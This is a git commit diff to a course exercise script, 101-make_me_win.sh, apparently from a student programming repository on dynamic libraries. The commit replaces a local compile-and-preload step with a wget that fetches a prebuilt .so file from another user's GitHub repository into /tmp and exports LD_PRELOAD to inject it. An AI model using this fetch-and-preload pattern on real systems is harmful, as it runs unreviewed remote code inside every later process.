b94dc4cd0e8a68f6f250b8b214991409cf7e0f97
EliezerSunny <adetunjieliazer@gmail.com>
2024-08-22 19:23:51 -0700

    modified

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-gcc -shared -fPIC -o libhack.so -nostartfiles -D_GNU_SOURCE -Wall -Werror win.c -ldl
-LD_PRELOAD=./libhack.so ./gm 9 8 10 24 75 9
+wget -P /tmp https://github.com/eyoul/alx-low_level_programming/raw/main/0x18-dynamic_libraries/iwin.so
+export LD_PRELOAD=/tmp/iwin.so
